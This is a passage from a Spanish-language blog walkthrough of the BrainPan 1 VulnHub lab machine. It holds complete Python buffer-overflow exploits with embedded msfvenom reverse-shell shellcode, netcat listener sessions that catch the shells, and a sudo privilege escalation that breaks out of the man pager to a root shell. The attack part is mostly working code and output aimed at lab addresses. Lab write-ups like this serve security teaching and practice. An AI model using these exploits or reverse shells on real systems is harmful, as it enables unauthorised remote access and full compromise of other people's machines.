buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">a4</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">ee</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">f2</span><span class="se">\x</span><span class="s2">1d</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">9f</span><span class="se">\x</span><span class="s2">f2</span><span class="se">\x</span><span class="s2">68"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">26</span><span class="se">\x</span><span class="s2">16</span><span class="se">\x</span><span class="s2">df</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">9d</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">9f</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">be"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">ca</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">d4</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">9b</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">2c</span><span class="se">\x</span><span class="s2">87</span><span class="se">\x</span><span class="s2">9d</span><span class="se">\x</span><span class="s2">cb"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">a8</span><span class="se">\x</span><span class="s2">e0</span><span class="se">\x</span><span class="s2">25</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">09</span><span class="se">\x</span><span class="s2">ee</span><span class="se">\x</span><span class="s2">a4</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">35</span><span class="se">\x</span><span class="s2">d4</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">b5"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">fb</span><span class="se">\x</span><span class="s2">e0</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">14</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">ab"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">de</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">98</span><span class="se">\x</span><span class="s2">ed</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">5b</span><span class="se">\x</span><span class="s2">7b"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">8c</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">93</span><span class="se">\x</span><span class="s2">df</span><span class="se">\x</span><span class="s2">14</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">f5</span><span class="se">\x</span><span class="s2">60"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">9c</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">5d</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">9f"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">cb</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">86</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">eb"</span>
</code></pre></div></div>

<p>Ya tenemos todo para generar la explotación de la máquina  (<strong>Nota</strong>: Recordar colocar el valor de <strong>EIP</strong> en <a href="https://es.wikipedia.org/wiki/Endianness">little-endian</a> y además se agregan <strong>NOPS</strong> que sirven como de colchón para que nuestro shellcode se ejecute correctamente):</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
#coding:utf-8
</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">signal</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span><span class="n">frame</span><span class="p">):</span>
    <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">[!] Saliendo..."</span>
    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span><span class="n">def_handler</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Buffer Overflow"</span><span class="p">)</span>
    <span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Generando cadena a través de un patrón"</span><span class="p">)</span> 
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="c1"># Shellcode
</span>    <span class="n">buf</span> <span class="o">=</span>  <span class="n">b</span><span class="s">""</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\xd9\xc3\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1\x52\xb8\xcc</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x6a\xb1\xb0\x31\x43\x17\x03\x43\x17\x83\x0f\x6e\x53</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x45\x73\x87\x11\xa6\x8b\x58\x76\x2e\x6e\x69\xb6\x54</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\xfb\xda\x06\x1e\xa9\xd6\xed\x72\x59\x6c\x83\x5a\x6e</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\xc5\x2e\xbd\x41\xd6\x03\xfd\xc0\x54\x5e\xd2\x22\x64</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x91\x27\x23\xa1\xcc\xca\x71\x7a\x9a\x79\x65\x0f\xd6</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x41\x0e\x43\xf6\xc1\xf3\x14\xf9\xe0\xa2\x2f\xa0\x22</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x45\xe3\xd8\x6a\x5d\xe0\xe5\x25\xd6\xd2\x92\xb7\x3e</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x2b\x5a\x1b\x7f\x83\xa9\x65\xb8\x24\x52\x10\xb0\x56</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\xef\x23\x07\x24\x2b\xa1\x93\x8e\xb8\x11\x7f\x2e\x6c</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\xc7\xf4\x3c\xd9\x83\x52\x21\xdc\x40\xe9\x5d\x55\x67</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x3d\xd4\x2d\x4c\x99\xbc\xf6\xed\xb8\x18\x58\x11\xda</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\xc2\x05\xb7\x91\xef\x52\xca\xf8\x67\x96\xe7\x02\x78</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\xb0\x70\x71\x4a\x1f\x2b\x1d\xe6\xe8\xf5\xda\x09\xc3</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x42\x74\xf4\xec\xb2\x5d\x33\xb8\xe2\xf5\x92\xc1\x68</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x05\x1a\x14\x3e\x55\xb4\xc7\xff\x05\x74\xb8\x97\x4f</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x7b\xe7\x88\x70\x51\x80\x23\x8b\x32\xa5\xb3\x93\xdb</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\xd1\xb1\x93\xda\x9a\x3f\x75\xb6\xcc\x69\x2e\x2f\x74</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x30\xa4\xce\x79\xee\xc1\xd1\xf2\x1d\x36\x9f\xf2\x68</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x24\x48\xf3\x26\x16\xdf\x0c\x9d\x3e\x83\x9f\x7a\xbe</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\xca\x83\xd4\xe9\x9b\x72\x2d\x7f\x36\x2c\x87\x9d\xcb</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\xa8\xe0\x25\x10\x09\xee\xa4\xd5\x35\xd4\xb6\x23\xb5</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x50\xe2\xfb\xe0\x0e\x5c\xba\x5a\xe1\x36\x14\x30\xab</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\xde\xe1\x7a\x6c\x98\xed\x56\x1a\x44\x5f\x0f\x5b\x7b</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x50\xc7\x6b\x04\x8c\x77\x93\xdf\x14\x97\x76\xf5\x60</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x30\x2f\x9c\xc8\x5d\xd0\x4b\x0e\x58\x53\x79\xef\x9f</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x4b\x08\xea\xe4\xcb\xe1\x86\x75\xbe\x05\x34\x75\xeb</span><span class="s">"</span>
    <span class="c1"># Buffer
</span>    <span class="n">junk</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">524</span>
    <span class="c1"># EIP en Little endian
</span>    <span class="n">eip</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xf3\x12\x17\x31</span><span class="s">"</span> <span class="c1">#311712F3
</span>    <span class="c1"># NOPS
</span>    <span class="n">nops</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">10</span>
    <span class="c1"># Resultado JUNK + EIP + NOPS + buf
</span>    <span class="n">bof</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">eip</span> <span class="o">+</span> <span class="n">nops</span> <span class="o">+</span> <span class="n">buf</span>
    <span class="n">server_address</span> <span class="o">=</span> <span class="p">(</span><span class="s">'10.0.0.30'</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># Create a TCP/IP socket
</span>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="c1"># Connect the socket to the port where the server is listening
</span>        <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">server_address</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">bof</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="n">p1</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Cadena enviada"</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
        <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

</code></pre></div></div>

<p>Si lo ejecutamos y nos ponemos en escucha por el puerto 443:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.0.0.25] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.0.30] 49768
Microsoft Windows <span class="o">[</span>Versin 10.0.19044.1620]
<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. Todos los derechos reservados.

<span class="nb">whoami
whoami
</span>k4miwindows<span class="se">\k</span>4miyo

C:<span class="se">\U</span>sers<span class="se">\k</span>4miyo<span class="se">\D</span>esktop&gt;
</code></pre></div></div>

<p>Hemos ganado acceso a la máquina Windows de nosotros. Con este mismo principio, vamos a tratar de acceder a la máquina víctima cambiando el shellcode a Linux:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
#coding:utf-8
</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">argparse</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span><span class="n">frame</span><span class="p">):</span>
    <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">[!] Saliendo..."</span>
    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span><span class="n">def_handler</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">makeRequest</span><span class="p">(</span><span class="n">rhost</span><span class="p">):</span>
    <span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Buffer Overflow BrainPan 1 Vuln"</span><span class="p">)</span>
    <span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Generando variables necesarias para enviar al servidor </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">rhost</span><span class="p">)</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="c1"># Shellcode
</span>    <span class="c1"># msfvenom -p linux/x86/shell_reverse_tcp --platform Linux -a x86 lhost=x.x.x.x lport=443 EXITFUNC=thread -f python -b "\x00"
</span>    <span class="n">buf</span> <span class="o">=</span>  <span class="n">b</span><span class="s">""</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\xd9\xf6\xb8\x1b\x8b\x39\xb9\xd9\x74\x24\xf4\x5a\x31</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\xc9\xb1\x12\x31\x42\x17\x03\x42\x17\x83\xf1\x77\xdb</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x4c\x34\x53\xeb\x4c\x65\x20\x47\xf9\x8b\x2f\x86\x4d</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\xed\xe2\xc9\x3d\xa8\x4c\xf6\x8c\xca\xe4\x70\xf6\xa2</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\xfc\x82\x08\x2b\x69\x81\x08\x4a\xd2\x0c\xe9\xfc\x42</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x5f\xbb\xaf\x39\x5c\xb2\xae\xf3\xe3\x96\x58\x62\xcb</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x65\xf0\x12\x3c\xa5\x62\x8a\xcb\x5a\x30\x1f\x45\x7d</span><span class="s">"</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x04\x94\x98\xfe</span><span class="s">"</span>
    <span class="c1"># Buffer
</span>    <span class="n">junk</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">524</span>
    <span class="c1"># EIP en Little endian
</span>    <span class="n">eip</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xf3\x12\x17\x31</span><span class="s">"</span> <span class="c1">#311712F3
</span>    <span class="c1"># NOPS
</span>    <span class="n">nops</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">10</span>
    <span class="c1"># Result JUNK + EIP + NOPS + SHELLCODE
</span>    <span class="n">bof</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">eip</span> <span class="o">+</span> <span class="n">nops</span> <span class="o">+</span> <span class="n">buf</span>
    <span class="n">server_address</span> <span class="o">=</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Estableciendo conexión"</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="c1"># Create a TCP/IP socket
</span>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="c1"># Connect the socket to the port where the server is listening
</span>        <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">server_address</span><span class="p">)</span>
        <span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Enviando el Buffer Overflow..."</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">bof</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="n">p1</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Ataque realizado con éxito"</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
        <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">argparser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Buffer Overflow de la máquina BrainPan 1 VulnHub'</span><span class="p">)</span>
    <span class="n">argparser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--rhost'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
            <span class="n">help</span><span class="o">=</span><span class="s">'Remote host ip (Victim)'</span><span class="p">,</span>
            <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">argparser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
    <span class="n">rhost</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">rhost</span>
    <span class="n">makeRequest</span><span class="p">(</span><span class="n">rhost</span><span class="p">)</span>

</code></pre></div></div>

<p>Nos ponemos en escucha por el puerto 443 y procedemos a ejecutarlo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python2 BrainPan1_BOF.py <span class="nt">--rhost</span> 10.0.0.32
<span class="o">[</span>+] Buffer Overflow BrainPan 1 Vuln: Ataque realizado con éxito
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.0.0.25] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.0.32] 48061
<span class="nb">whoami
</span>puck
</code></pre></div></div>

<p>Ya nos encontramos dentro de la máquina víctima como el usuario <strong>puck</strong> y para trabajar más cómodos vamos a hacer un <a href="/tratamiento-tty">Tratamiento de la tty</a>.  Vamos a enumerar un poco el sistema para ver de que forma podemos escalar privilegios:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>puck@brainpan:/home/puck<span class="nv">$ </span><span class="nb">id 
</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>puck<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>puck<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>puck<span class="o">)</span>
puck@brainpan:/home/puck<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>puck on this host:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User puck may run the following commands on this host:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /home/anansi/bin/anansi_util
puck@brainpan:/home/puck<span class="err">$</span>
</code></pre></div></div>

<p>Vemos que podemos ejecutar <code class="language-plaintext highlighter-rouge">/home/anansi/bin/anansi_util</code> como el usuario <strong>root</strong> sin proporcionar contraseña.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>puck@brainpan:/home/puck<span class="nv">$ </span><span class="nb">sudo</span> /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util <span class="o">[</span>action]
Where <span class="o">[</span>action] is one of:
  - network
  - proclist
  - manual <span class="o">[</span><span class="nb">command</span><span class="o">]</span>
puck@brainpan:/home/puck<span class="err">$</span>
</code></pre></div></div>

<p>Si lo ejecutamos, vemos que nos pide algunos parámetros y uno que ya nos llama la atención es <code class="language-plaintext highlighter-rouge">manual</code> ya que podemos introducir un comando. Vamos a probar con un <code class="language-plaintext highlighter-rouge">whoami</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>puck@brainpan:/home/puck<span class="nv">$ </span><span class="nb">sudo</span> /home/anansi/bin/anansi_util manual <span class="nb">whoami</span>
</code></pre></div></div>

<p>Se nos despliega el <code class="language-plaintext highlighter-rouge">man</code> del comando <code class="language-plaintext highlighter-rouge">whoami</code>; por lo tanto, podríamos tratar de desplegarnos una <code class="language-plaintext highlighter-rouge">/bin/bash</code> introduciendo el comando <code class="language-plaintext highlighter-rouge">!/bin/bash</code> sin salir del <code class="language-plaintext highlighter-rouge">man</code> del comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SEE ALSO
       The  full  documentation  <span class="k">for  </span><span class="nb">whoami </span>is maintained as a Texinfo manual.  If the info and <span class="nb">whoami </span>programs are properly
       installed at your site, the <span class="nb">command

              </span>info coreutils <span class="s1">'whoami invocation'</span>

       should give you access to the <span class="nb">complete </span>manual.

GNU coreutils 8.12.197-032bb                            September 2011                                              WHOAMI<span class="o">(</span>1<span class="o">)</span>
 Manual page <span class="nb">whoami</span><span class="o">(</span>1<span class="o">)</span> line 1/44 <span class="o">(</span>END<span class="o">)</span> <span class="o">(</span>press h <span class="k">for </span><span class="nb">help </span>or q to quit<span class="o">)</span>
<span class="o">!</span>/bin/bash
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>puck@brainpan:/home/puck<span class="nv">$ </span><span class="nb">sudo</span> /home/anansi/bin/anansi_util manual <span class="nb">whoami
</span>No manual entry <span class="k">for </span>manual
root@brainpan:/usr/share/man# <span class="nb">whoami
</span>root
root@brainpan:/usr/share/man#
</code></pre></div></div>

<p>Ya somos el usuario <strong>root</strong>.</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#buffer-overflow" class="page__taxonomy-item" rel="tag">Buffer_Overflow</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-04-04T00:00:00-05:00">April 04, 2022</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/vh-empirebreakout/" class="pagination--pager" title="VulnHub Empire BreakOut
">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

